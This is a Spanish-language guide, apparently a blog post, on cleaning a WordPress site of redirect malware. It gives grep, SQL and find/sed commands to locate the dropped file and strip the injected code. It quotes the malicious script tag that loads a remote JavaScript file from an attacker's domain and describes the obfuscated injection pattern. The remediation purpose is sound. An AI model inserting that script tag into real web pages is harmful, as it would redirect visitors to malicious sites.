# Pasos para remover malware de redireccion de wordpress

Hay un nuevo malware que inyecta una redireccion en javascript a sitios maliciosos.
por lo general agrega un script remoto como el siguiente

    <script src=’https://js.donatelloflowfirstly.ga/stat.js?n=ns1' type=’text/javascript’></script>


La URL del script puede cambiar, pero el mecanismo es el mismo.

## Encontrar el malware

Para remover este malware, se debe intervenir en la base de datos y en los archivos.

Lo primero es localizar un archivo sin extensión en el servidor, por lo general el archivo se llama "_a", pero tiene variantes del tipo "_2" o "_5".
Para localizar el archivo, debemos basarnos en su contenido, Para infectar el sitio, el malware contiene una instrucción que busca en todas las tablas de nombre parecido a post, y esa instrucción es la que usaremos para encontrarlo.

Dentro del servidor, via terminal, debemos ejecutar dentro del directorio web de nuestro sitio:

    $ grep -rl 'SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES' .

Esta orden nos mostrara la ubicación del archivo que tiene esa sentencia. Es muy probable que ese archivo sea el malware inyectado. Una vez localizado, lo mejor es borrarlo.

### Base de datos

El malware cambia las urls dentro de wp_options, que estan contenidas en las llaves "siteurl" y "home", por lo que lo primero que debemos hacer en la base de datos es cambiar esta información por la de nuestro sitio:

    > update wp_options set option_value = '<url de nuestro sitio>' where option_name = 'siteurl';
    > update wp_options set option_value = '<url de nuestro sitio>' where option_name = 'home';
    

El malware, además, inyecta en todos los posts, un tag de script para que al cargar cualquier contenido del sitio, este redirija a los sitios maliciosos. este debe ser removido mediante un update a la tabla posts de nuestro sitio:

    > UPDATE wp_posts SET post_content = (REPLACE (post_content, "<script src=’https://js.donatelloflowfirstly.ga/stat.js?n=ns1' type=’text/javascript’></script>", ""));

El tag script puede cambiar el src, pero el procedimiento es el mismo, solo cambiamos el contenido a reemplazar en la sentencia REPLACE.

Con esto, ya la base de datos esta limpia.

### Archivos del sitio.

Lo más molesto de este malware, es que infecta todos los archivos index de nuestro sitio, además de todos los archivos JS del mismo. Para remover de los archivos las inyecciones usaremos find + sed en una terminal

Lo primero es localizar todos los archivos que tengan inyectado el script, para eso ejecutamos el siguiente comando:

    $ find . -type f -name '*' -exec sed -i "s#<script src=’https://js.donatelloflowfirstly.ga/stat.js?n=ns1' type=’text/javascript’></script>##g" \{\} \;

Lo que hace este comando es:
  * busca todos los archivos dentro de la ubicación actual de manera recursiva
  * sobre la salida de find, aplica un reemplazo del tag script, dejando en blanco, sin tocar el resto del archivo
  
Finalmente, debemos limpiar los archivos JS contaminados, acá el tema se complica un poco, ya que para inyectar dentro de los archivos js, hace un append mediante String.fromCharCode(), pero la estructura de la funcion es la misma, asi que aplicamos sed + find nuevamente, 

    $ find . -type f -name '*' -exec sed -i 's/Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() {.*appendChild.*})();//g' \{\} \;
    
Esto, al igual que la sentencia anterior, busca y reemplaza todas las coincidencias de este metodo dentro de todos los archivos de nuestro sitio.

Espero sea de ayuda para quien lo encuentre.
